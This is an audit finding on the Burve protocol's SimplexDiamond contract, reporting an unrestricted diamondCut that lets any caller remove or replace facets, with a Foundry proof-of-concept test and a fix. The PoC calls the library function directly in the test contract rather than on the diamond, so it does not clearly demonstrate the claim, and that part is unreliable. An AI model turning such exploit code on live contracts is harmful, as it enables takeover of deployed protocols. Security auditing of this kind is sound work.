---
# Core Classification
protocol: Burve_2025-01-29
chain: everychain
category: uncategorized
vulnerability_type: unknown

# Attack Vector Details
attack_type: unknown
affected_component: smart_contract

# Source Information
source: solodit
solodit_id: 55210
audit_firm: Pashov Audit Group
contest_link: none
source_link: https://github.com/pashov/audits/blob/master/team/md/Burve-security-review_2025-01-29.md
github_link: none

# Impact Classification
severity: high
impact: security_vulnerability
exploitability: 1.00
financial_impact: high

# Scoring
quality_score: 5
rarity_score: 5

# Context Tags
tags:

# Audit Details
report_date: unknown
finders_count: 1
finders:
  - Pashov Audit Group
---

## Vulnerability Title

[C-03] Unrestricted `diamondCut` allows unauthorized facet modifications

### Overview


The report discusses a bug in the `SimplexDiamond` contract which allows anyone to modify the contract's functionality by calling the `DiamondCutFacet.diamondCut.selector` function. This can potentially lead to loss of control over the contract. The report provides a proof of concept test case to demonstrate how a random user can exploit this bug. The report recommends implementing permission checks to restrict access to the `diamondCut` function to authorized admins.

### Original Finding Content

## Severity

**Impact:** High

**Likelihood:** High

## Description

## Description

The `SimplexDiamond` contract includes `DiamondCutFacet.diamondCut.selector` in its selectors. This function allows adding, removing, or modifying facet cuts, which determine the contract’s functionality. However, **this function is not restricted**, meaning **anyone** can call it to remove or replace any selector or facet.

### **Proof of Concept (PoC)**

The test case below demonstrates how a random user can call `diamondCut` to remove or modify contract functionality, potentially leading to loss of control over the contract.

```solidity
// SPDX-License-Identifier: BUSL-1.1
pragma solidity ^0.8.17;

import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";
import {BurveDeploymentLib} from "../../src/deployment/BurveDeployLib.sol";
import {SimplexDiamond} from "../../src/multi/Diamond.sol";
import {StorageFacet} from "../mocks/StorageFacet.sol";
import {IDiamond} from "Commons/Diamond/interfaces/IDiamond.sol";
import {LibDiamond} from "Commons/Diamond/libraries/LibDiamond.sol";

contract EdgeFacetTest is Test {
    SimplexDiamond public diamond;
    StorageFacet public storageFacet;
    address public owner = makeAddr("owner");
    StorageFacet public storageFacetContract;

    function setUp() public {
        vm.startPrank(owner);

        // Deploy the diamond and facets
        (address liqFacetAddr, address simplexFacetAddr, address swapFacetAddr) = BurveDeploymentLib.deployFacets();

        // Deploy storage facet
        storageFacetContract = new StorageFacet();

        // Create the diamond with initial facets
        diamond = new SimplexDiamond(liqFacetAddr, simplexFacetAddr, swapFacetAddr);

        // Add storage facet using LibDiamond directly since we're the owner
        bytes4[] memory selectors = new bytes4[](1);
        selectors[0] = StorageFacet.getEdge.selector;

        IDiamond.FacetCut[] memory cuts = new IDiamond.FacetCut[](1);
        cuts[0] = IDiamond.FacetCut({
            facetAddress: address(storageFacetContract),
            action: IDiamond.FacetCutAction.Add,
            functionSelectors: selectors
        });

        LibDiamond.diamondCut(cuts, address(0), "");

        vm.stopPrank();
    }

    function test_rediamondCut() public {
        vm.startPrank(makeAddr("random_user"));
        // Add storage facet using LibDiamond directly since we're the owner
        bytes4[] memory selectors = new bytes4[](1);
        selectors[0] = StorageFacet.getEdge.selector;

        IDiamond.FacetCut[] memory cuts = new IDiamond.FacetCut[](1);
        cuts[0] = IDiamond.FacetCut({
            facetAddress: address(0),
            action: IDiamond.FacetCutAction.Remove,
            functionSelectors: selectors
        });

        LibDiamond.diamondCut(cuts, address(0), "");
    }
}
```

## Recommendations

Restrict the `diamondCut` function to only be callable by an authorized admin by implementing `AdminLib.validateOwner()` or similar permission checks.

### Metadata

| Field | Value |
|-------|-------|
| Impact | HIGH |
| Quality Score | 5/5 |
| Rarity Score | 5/5 |
| Audit Firm | Pashov Audit Group |
| Protocol | Burve_2025-01-29 |
| Report Date | N/A |
| Finders | Pashov Audit Group |

### Source Links

- **Source**: https://github.com/pashov/audits/blob/master/team/md/Burve-security-review_2025-01-29.md
- **GitHub**: N/A
- **Contest**: N/A

### Keywords for Search

`vulnerability`

